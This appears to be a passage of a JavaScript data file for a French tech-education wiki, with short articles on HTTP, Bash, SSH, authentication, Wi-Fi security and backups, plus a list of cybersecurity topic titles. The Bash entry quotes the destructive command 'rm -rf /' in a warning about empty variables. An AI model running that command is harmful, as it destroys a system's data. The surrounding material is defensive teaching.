{h:"Jusqu'où ?",body:"<p>Additionneurs → ALU → CPU. Mémoire + horloge + jeu d'instructions = un ordinateur complet. Tout le reste est de l'échelle.</p>"}]},

{id:"hexadecimal",title:"Hexadécimal",cat:"concept",tags:["hexa","binaire","couleurs"],level:1,danger:0,updated:"2026-10-09",read:2,excerpt:"La base 16 des pros : couleurs #FF4D00, adresses mémoire, dumps. 1 chiffre = 4 bits, zéro douleur.",parent:"debut-informatique",
infobox:{Base:"16 (0-9, A-F)",Repère:"1 octet = 2 chiffres",Préfixe:"0x"},
sections:[
{h:"Convertir",body:"<p>Coupez le binaire par tranches de 4 bits : <code>1111 1111</code> = <code>FF</code> = 255. Inversement, chaque chiffre hexa se déplie en 4 bits (A = 1010).</p>",code:{lang:"python",code:"print(hex(255))        # 0xff\nprint(int('FF', 16))    # 255\nprint(f'{(77):02X}')     # 4D — le vert de #FF4D00"}},
{h:"Où on le croise",body:"<ul><li><b>Couleurs :</b> <code>#RRVVBB</code> (rouge, vert, bleu).</li><li><b>Mémoire :</b> adresses <code>0x7ff3a2</code>, dumps, checksums.</li><li><b>Réseau :</b> adresses MAC, IPv6.</li></ul>"}]},

{id:"ascii-unicode",title:"ASCII & Unicode",cat:"concept",tags:["texte","encodage","unicode"],level:1,danger:0,updated:"2026-10-09",read:2,excerpt:"Comment « Bonjour 🎉 » devient des nombres : ASCII, UTF-8, émojis multi-octets. Et les bugs d'encodage.",parent:"debut-informatique",
infobox:{Standard:"Unicode · UTF-8",Astuce:"UTF-8 ⊃ ASCII",Piège:"mojibake"},
sections:[
{h:"D'ASCII à Unicode",body:"<p><b>ASCII</b> (1963) : 128 caractères anglais. <b>Unicode</b> : 150 000+ symboles pour toutes les langues. <b>UTF-8</b> : l'encodage malin — 1 octet pour l'ASCII (rétrocompatible), jusqu'à 4 pour le reste.</p>"},
{h:"Le mojibake",body:"<div class='warn'>⚠ « Ã© » au lieu de « é » = texte UTF-8 lu comme Latin-1. Toujours déclarer l'encodage (HTML <code>charset=utf-8</code>, fichiers, bases) et ne jamais deviner.</div>"}]},

{id:"http",title:"HTTP",cat:"web",tags:["http","web","réseau","api"],level:2,danger:0,updated:"2026-10-09",read:2,excerpt:"Le dialogue client-serveur : méthodes, statuts, en-têtes, HTTPS. Comprendre HTTP, c'est comprendre le web.",
parent:"api-rest",
infobox:{Rôle:"Dialogue client ↔ serveur",Versions:"HTTP/1.1 · HTTP/2 · HTTP/3",Chiffrement:"TLS (HTTPS)"},
sections:[
{h:"Anatomie d'une requête",body:"<p>Chaque clic = une <b>requête</b> (méthode + URL + en-têtes + corps éventuel) et une <b>réponse</b> (statut + en-têtes + corps). Tout le web tient dans ce ping-pong texte.</p>",code:{lang:"http",code:"GET /article/http/ HTTP/1.1\nHost: infoduweb-codex.pages.dev\nAccept: text/html\n\nHTTP/1.1 200 OK\nContent-Type: text/html\n\n<!DOCTYPE html>..."}},
{h:"Méthodes & statuts",body:"<table class='fiche'><tr><th>Code</th><th>Sens</th><th>Réflexe</th></tr><tr><td>200 / 201</td><td>OK / Créé</td><td>Rien à signaler</td></tr><tr><td>301 / 304</td><td>Redirection / Non modifié</td><td>Cache & SEO</td></tr><tr><td>400 / 401 / 403 / 404</td><td>Requête, auth, droits, introuvable</td><td>Côté client</td></tr><tr><td>429</td><td>Trop de requêtes</td><td>Ralentir (rate limit)</td></tr><tr><td>500 / 502 / 503</td><td>Erreur serveur</td><td>Côté serveur, logs</td></tr></table><p>Méthodes : <b>GET</b> (lire), <b>POST</b> (créer), <b>PUT/PATCH</b> (remplacer/modifier), <b>DELETE</b> (supprimer).</p>"},
{h:"HTTPS partout",body:"<p><b>HTTPS</b> = HTTP dans un tunnel chiffré <b>TLS</b> : confidentialité, intégrité, identité du serveur vérifiée par certificat. En 2026, le HTTP clair est une anomalie.</p><div class='warn'>⚠ <b>Contenu mixte</b> (page HTTPS qui charge du HTTP), certificats expirés, TLS obsolètes : le navigateur prévient — écoutez-le. <b>HSTS</b> force le HTTPS côté serveur.</div>"},
{h:"Voir le trafic",body:"<ul><li><b>curl -v</b> : la requête et la réponse, en-têtes inclus.</li><li><b>Onglet Réseau</b> des devtools : temps, tailles, cache, waterfall.</li><li>Méfiance : bien souvent, un « bug réseau » vient du DNS, du cache ou du CORS.</li></ul>"}]},

{id:"bash",title:"Bash & Shell",cat:"langage",tags:["bash","shell","terminal","script"],level:2,danger:0,updated:"2026-10-09",read:2,excerpt:"Le langage du terminal : scripts, pipes, automatisation. Dix réflexes pour ne plus rien faire à la main.",
parent:"linux",
infobox:{Naissance:"Bourne (1977) · Bash (1989)",Usage:"Scripts · DevOps · Terminal",Devise:"Tout est texte"},
sections:[
{h:"Le shell, ce robot",body:"<p>Un script shell enchaîne des commandes comme vous les taperiez — en mieux : variables, tests, boucles, tubes (<code>|</code>) qui relient les outils entre eux.</p>",code:{lang:"bash",code:"#!/usr/bin/env bash\nset -euo pipefail\n\n# Sauvegarde datée du dossier site\nsrc=\"$HOME/site\" dst=\"$HOME/backups/site-$(date +%F).tar.gz\"\ntar -czf \"$dst\" \"$src\" && echo \"OK : $dst\""}},
{h:"Sécurité des scripts",body:"<div class='warn'>⚠ <code>rm -rf $dossier</code> sans guillemets + variable vide = catastrophe (<code>rm -rf /</code> a déjà tué des serveurs). <b>Toujours</b> : <code>set -euo pipefail</code>, variables entre guillemets, et <code>shellcheck</code> avant d'exécuter.</div>"},
{h:"One-liners utiles",body:"<ul><li><code>grep -r \"TODO\" .</code> : fouiller un projet.</li><li><code>find . -name \"*.log\" -mtime +30 -delete</code> : ménage (tester sans <code>-delete</code> d'abord).</li><li><code>for f in *.jpg; do convert \"$f\" -resize 50% \"petit-$f\"; done</code> : traiter un lot.</li></ul>"}]},

{id:"authentification",title:"Authentification",cat:"cyber",tags:["auth","mots de passe","mfa","passkeys"],level:2,danger:0,updated:"2026-10-09",read:2,related:["phishing","csrf","cryptographie"],excerpt:"Mots de passe, MFA, passkeys, OAuth : prouver qui on est sans se faire voler. Le guide défensif complet.",
parent:"cryptographie",
infobox:{Piliers:"Ce que je sais · ai · suis",Standard:"Passkeys · TOTP · OAuth2",Contre:"SMS seul · Réutilisation"},
sections:[
{h:"Mots de passe : la fin d'une époque",body:"<ul><li><b>Gestionnaire</b> (Bitwarden, KeePass…) : un mot de passe unique et long par site, vous n'en retenez qu'un seul.</li><li><b>4 mots aléatoires</b> valent mieux que <code>P@ssw0rd!</code> (entropie + mémorisation).</li><li><b>Jamais réutilisé</b> : une fuite ailleurs ne doit pas ouvrir vos comptes (credential stuffing).</li></ul><div class='warn'>⚠ Vérifiez vos adresses sur <b>haveibeenpwned.com</b> et changez tout mot de passe compromis.</div>"},
{h:"MFA : le deuxième verrou",body:"<p>Le mot de passe seul ne suffit plus : ajoutez un <b>second facteur</b>. Hiérarchie : <b>clé FIDO2</b> (imbattable) > <b>TOTP</b> (appli type Aegis) > <b>SMS</b> (vulnérable au SIM-swap, à n'utiliser qu'en dernier recours).</p>"},
{h:"Passkeys & « Continuer avec »",body:"<p>Les <b>passkeys</b> (WebAuthn) remplacent le mot de passe par une clé cryptographique liée à votre appareil + biométrie : résistantes au phishing par construction. Le bouton « Continuer avec … » délègue l'authentification via <b>OAuth2/OIDC</b> : pratique, mais vérifiez les <b>scopes</b> demandés.</p>"},
{h:"Côté développeur",body:"<ul><li>Mots de passe <b>hachés</b> (Argon2, bcrypt), jamais chiffrés, jamais en clair, jamais en log.</li><li><b>Rate limiting</b> + verrouillage progressif contre le bourrage.</li><li>Sessions : cookies <code>HttpOnly; Secure; SameSite</code>, déconnexion qui révoque vraiment.</li></ul>"}]},

{id:"ssh",title:"SSH",cat:"systeme",tags:["ssh","terminal","clés","admin"],level:2,danger:0,updated:"2026-10-09",read:2,excerpt:"La porte blindée des serveurs : clés ed25519, config propre, tunnels. Fini les mots de passe en clair.",
parent:"linux",
infobox:{Port:"22",Auth:"Clés ed25519",Config:"~/.ssh/config"},
sections:[
{h:"Clés, pas mots de passe",body:"<p>Une paire de clés (publique sur le serveur, privée chez vous, protégée par passphrase) remplace les mots de passe : inviolable par force brute et plus pratique au quotidien.</p>",code:{lang:"bash",code:"ssh-keygen -t ed25519 -C \"moi@machine\"\nssh-copy-id user@serveur   # dépose la clé publique\nssh user@serveur           # connexion sans mot de passe"}},
{h:"Durcir le serveur",body:"<ul><li><code>PasswordAuthentication no</code>, <code>PermitRootLogin no</code>.</li><li><b>fail2ban</b> contre les robots qui labourent le port 22.</li><li>Mises à jour, et <b>jamais</b> de transfert d'agent (<code>-A</code>) vers une machine non fiable.</li></ul><div class='warn'>⚠ Changer de port ne sécurise rien (obscurité ≠ sécurité), mais réduit le bruit des logs.</div>"},
{h:"Tunnels utiles",body:"<ul><li><code>ssh -L 8080:localhost:80 serveur</code> : exposer un service distant en local.</li><li><code>scp</code> / <code>rsync -avz -e ssh</code> : copier des fichiers chiffrés.</li><li><code>~/.ssh/config</code> : alias, utilisateur et clé par hôte — fini les pavés de commande.</li></ul>"}]},

{id:"compilation",title:"Compilation vs interprétation",cat:"concept",tags:["compilation","bytecode","jit","cpu"],level:2,danger:0,updated:"2026-10-09",read:2,excerpt:"Compilé, bytecode, interprété, JIT : quatre façons de transformer du texte en programme qui tourne.",
parent:"c-lang",
infobox:{Chaînes:"Compilé · Bytecode · Interprété · JIT",Exemples:"C · Java · Python · JS (V8)"},
sections:[
{h:"Trois (et demie) façons d'exécuter",body:"<table class='fiche'><tr><th>Mode</th><th>Principe</th><th>Exemples</th></tr><tr><td><b>Compilé</b></td><td>Traduit en binaire avant l'exécution : rapide, mais un build par machine</td><td>C, C++, Rust, Go</td></tr><tr><td><b>Bytecode</b></td><td>Compilé vers un langage de machine virtuelle, portable</td><td>Java (JVM), C# (.NET), Kotlin</td></tr><tr><td><b>Interprété</b></td><td>Lu et exécuté ligne à ligne : souple, plus lent</td><td>Python, Ruby, PHP</td></tr><tr><td><b>JIT</b></td><td>Compile à chaud les bouts chauds pendant l'exécution</td><td>JavaScript (V8), Java (HotSpot), PyPy</td></tr></table>"},
{h:"La chaîne de compilation",body:"<p>Préprocesseur → compilation → assemblage → <b>édition de liens</b> : chaque étape a ses erreurs propres. Une erreur de <i>compilation</i> = le code ne respecte pas le langage ; une erreur d'<i>édition de liens</i> = il manque un morceau (librairie).</p>"},
{h:"Lire une erreur comme un pro",body:"<div class='tip'>✔ Lisez le <b>premier</b> message en entier (les suivants sont souvent des conséquences), repérez fichier:ligne, reproduisez au minimal. Les symboles de debug (<code>-g</code>) et un <code>gdb</code>/<code>lldb</code> de base changent la vie en C/C++/Rust.</div>"}]},

{id:"css",title:"CSS moderne",cat:"web",tags:["css","frontend","design"],level:2,danger:0,updated:"2026-10-09",read:2,excerpt:"Cascade, Flexbox, Grid, variables, responsive : le CSS d'aujourd'hui n'a plus rien du bricolage d'hier.",
parent:"html-css",
infobox:{Rôle:"Présentation & mise en page",Outils:"Flexbox · Grid · Custom props",Devise:"Mobile-first"},
sections:[
{h:"Cascade & spécificité",body:"<p>Quand deux règles se battent, gagne la plus <b>spécifique</b> (id > classe > élément), à égalité la <b>dernière</b>. <code>!important</code> est l'arme nucléaire : à bannir sauf utilitaire assumé.</p>",code:{lang:"css",code:":root { --accent: #FF4D00; --gap: 1.2rem; }\n\n.card {\n  display: grid;\n  gap: var(--gap);\n  padding: clamp(1rem, 3vw, 2rem);\n}"}},
{h:"Flexbox ou Grid ?",body:"<ul><li><b>Flexbox :</b> aligner dans <b>une</b> direction (barre de nav, ligne de boutons).</li><li><b>Grid :</b> des mises en page à <b>deux</b> dimensions (galeries, gabarits de page).</li><li>Les deux se combinent : Grid pour la page, Flexbox dans les composants.</li></ul>"},
{h:"Sobre, responsive, accessible",body:"<ul><li><code>clamp()</code> et unités relatives pour des typos fluides sans media queries.</li><li><code>prefers-reduced-motion</code> et <code>prefers-color-scheme</code> : respecter l'utilisateur.</li><li>Contrastes vérifiés (4,5:1 minimum pour le texte), focus visibles au clavier.</li></ul>"}]},

{id:"wifi-securite",title:"Sécurité Wi-Fi",cat:"cyber",tags:["wifi","réseau","wpa","evil-twin"],level:2,danger:2,updated:"2026-10-09",read:2,related:["mitm","cryptographie","authentification"],excerpt:"Evil twin, attaques par déauthentification, WPA3 : ce qui menace votre Wi-Fi et comment le verrouiller.",
parent:"mitm",
infobox:{Standard:"WPA2 · WPA3",Attaques:"Evil twin · Déauth · Capture handshake",Réflexe:"WPA3 + VPN sur réseaux publics"},
sections:[
{h:"Ce qui vous guette",body:"<ul><li><b>Evil twin :</b> un faux point d'accès au même nom capte votre trafic (voir Attaque Man-in-the-Middle).</li><li><b>Déauthentification :</b> des paquets forgés vous déconnectent pour vous forcer à vous reconnecter… sur le faux réseau.</li><li><b>Capture de handshake :</b> la poignée de main WPA2 enregistrée se fait casser hors-ligne si le mot de passe est faible.</li></ul><div class='warn'>⚠ Un Wi-Fi ouvert d'hôtel ou de gare = un réseau hostile par défaut : ne jamais y faire de banque ou d'admin sans <b>VPN</b>.</div>"},
{h:"Se protéger côté client",body:"<ul><li>Préférez le <b>WPA3</b> (ou WPA2 + mot de passe long et unique).</li><li><b>VPN fiable</b> sur tout réseau public ; oubliez les réseaux après usage.</li><li>Désactivez la connexion auto aux réseaux ouverts ; MFA partout.</li></ul>"},
{h:"Côté box / admin",body:"<ul><li>Firmware à jour, <b>WPS désactivé</b>, mot de passe d'admin changé.</li><li>Réseau <b>invité isolé</b> pour les visiteurs et les objets connectés.</li><li>WPA3-transition si des vieux appareils traînent, sinon WPA3 pur.</li></ul>"}]},

{id:"sauvegardes",title:"Sauvegardes (3-2-1)",cat:"systeme",tags:["backup","sauvegarde","ransomware"],level:1,danger:0,updated:"2026-10-09",read:2,excerpt:"La règle 3-2-1, l'automatisation et le test de restauration : l'assurance-vie de vos données.",
parent:"ransomware",
infobox:{Règle:"3 copies · 2 supports · 1 hors site",Test:"Restauration trimestrielle",Ennemis:"Ransomware · Vol · Incendie"},
sections:[
{h:"La règle 3-2-1",body:"<table class='fiche'><tr><th>Règle</th><th>Contre quoi</th></tr><tr><td><b>3</b> copies des données</td><td>Suppression accidentelle</td></tr><tr><td><b>2</b> supports différents</td><td>Disque mort</td></tr><tr><td><b>1</b> copie hors site / hors ligne</td><td>Vol, incendie, ransomware</td></tr></table>"},
{h:"Automatiser (sinon ça n'existe pas)",body:"<p>Ce qui n'est pas automatique n'est pas sauvegardé. Outils simples et chiffrés : <b>restic</b>, <b>borg</b>, <b>rsync</b> + cron, versioning cloud.</p>",code:{lang:"bash",code:"# Snapshot chiffré vers un disque externe\nrestic -r /media/backup/depot backup ~/documents --exclude '*.tmp'\nrestic -r /media/backup/depot forget --keep-daily 7 --keep-weekly 4 --prune"}},
{h:"Tester la restauration",body:"<div class='warn'>⚠ Un backup jamais testé n'est pas un backup. Restaurez un fichier chaque trimestre — et notez que le ransomware chiffre aussi les sauvegardes <b>restées connectées</b> : une copie hors ligne est non négociable.</div>"}]}
];

/* Corpus : 100 % fiches uniques — aucune génération de masse. */
(function buildCorpus(){
  const LANGS = [
    ["Python","python"],["JavaScript","javascript"],["TypeScript","typescript"],["C#","csharp"],
    ["C++","cpp"],["C","c-lang"],["Rust","rust"],["Go","go"],["Java","java"],["PHP","php"],
    ["Ruby","ruby"],["Swift","swift"],["Kotlin","kotlin"],["SQL","sql"]
  ];
  const LANG_TOPICS = ["Les bases en 20 minutes","Les fonctions avancées","La gestion d'erreurs","Les modules et paquets","La programmation asynchrone","Les tests unitaires","Les bonnes pratiques","Les erreurs fréquentes","Les structures de données","La lecture de fichiers","Les expressions régulières","Les décorateurs et annotations","La concurrence et le parallélisme","Le débogage méthodique","Les environnements virtuels","L'optimisation des performances","Les API et requêtes HTTP","La connexion aux bases de données","Le déploiement en production","Les outils et l'écosystème"];
  const CYBER_TOPICS = [
    ["XSS stockée","xss","Injection persistante via contenus enregistrés, exploitée à chaque affichage."],["Session hijacking","session","Vol et réutilisation de cookies de session pour usurper un compte."],
    ["Injection SQL aveugle","sql-injection","Exfiltration bit à bit sans message d'erreur, via conditions booléennes."],["Broken access control","api-rest","Accès à des objets ou fonctions d'autrui par manipulation d'identifiants."],
    ["Credential stuffing","phishing","Rejeu automatisé d'identifiants fuités sur d'autres services."],["Smishing","phishing","Phishing par SMS : faux colis, fausses banques, liens raccourcis."],
    ["Vishing","social-engineering","Phishing vocal : faux conseiller qui met en confiance puis récolte."],["Ransomware RaaS","ransomware","Écosystème d'affiliation : développeurs + affiliés se partagent les rançons."],
    ["Supply-chain attack","nodejs","Compromission via dépendance logicielle : un paquet vérolé infecte des milliers d'apps."],["Password spraying","cryptographie","Peu de mots de passe testés sur beaucoup de comptes pour éviter les verrouillages."],
    ["DNS tunneling","dns","Canal caché dans les requêtes DNS pour exfiltrer ou piloter discrètement."],["ARP spoofing","mitm","Empoisonnement du cache ARP pour intercepter le trafic local."],
    ["Evil twin Wi-Fi","mitm","Faux point d'accès au nom légitime pour capturer le trafic des victimes."],["DDoS applicatif","ddos","Épuisement de la logique métier (recherche, panier) plutôt que du tuyau réseau."],
    ["Botnet IoT","ddos","Armée d'objets connectés mal sécurisés, louée pour attaquer sur commande."],["Stealer","malware","Vol de mots de passe, cookies et portefeuilles crypto stockés dans le navigateur."],
    ["Rootkit","malware","Dissimulation au cœur du système pour persister invisible."],["Prétexting téléphonique","social-engineering","Scénario crédible pour soutirer une action ou une information."],
    ["BEC — fraude au président","phishing","Faux ordre de virement urgent venu d'un dirigeant usurpé."],["OSINT sur pseudonyme","osint","Recoupement d'alias, avatars et fuites pour remonter une identité numérique."]
  ];
  const SYS_TOPICS = ["Permissions Unix","Processus et signaux","Journalisation et logs","Sauvegardes 3-2-1","Durcissement SSH","Pare-feu et filtrage","Supervision et alertes","CI/CD pas à pas","Variables d'environnement","Secrets et coffres","Reverse proxy","Certificats TLS","Conteneurisation","Orchestration","Réseaux virtuels","Résolution de pannes"];
  const WEB_TOPICS = ["Sémantique HTML","Flexbox et Grid","Accessibilité","Formulaires sécurisés","Authentification","Sessions et cookies","CORS","Content Security Policy","Pagination d'API","Webhooks","WebSockets temps réel","Cache HTTP","SEO technique","Performance web","Tests end-to-end"];
  const CONCEPT_TOPICS = ["Récursivité","Complexité Big-O","Tables de hachage","Arbres et parcours","Graphes","Programmation fonctionnelle","Design patterns","SOLID","Expressions régulières","Encodages et Unicode","Dates et fuseaux horaires","Aléatoire et entropie","Concurrence vs parallélisme","Mémoire : pile et tas","Compilation vs interprétation"];

  const gen = [];
  const slug = s => s.toLowerCase().normalize("NFD").replace(/[̀-ͯ]/g,"").replace(/[^a-z0-9]+/g,"-").replace(/^-|-$/g,"");
  let n = 0;
  const push = (a) => { gen.push(a); };

  const SYS_BASE = ["linux","git","docker","tcp-ip","dns"];
  // (Les déclinaisons générées en masse ont été retirées : chaque fiche est rédigée.)

  window.DETAILED = DETAILED;
  window.ALL = DETAILED;
  window.TOTAL_PAGES = DETAILED.length;
})();
